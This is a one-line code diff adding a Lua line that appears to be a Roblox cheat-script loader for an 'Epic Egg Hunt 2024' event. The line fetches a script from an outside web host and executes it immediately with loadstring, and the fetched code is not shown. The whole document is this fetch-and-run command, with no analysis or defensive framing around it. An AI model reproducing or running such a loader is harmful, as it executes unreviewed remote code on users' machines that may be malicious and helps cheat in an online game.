@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://mewzz.vercel.app/scripts/EpicEggHunt2024.lua"))()
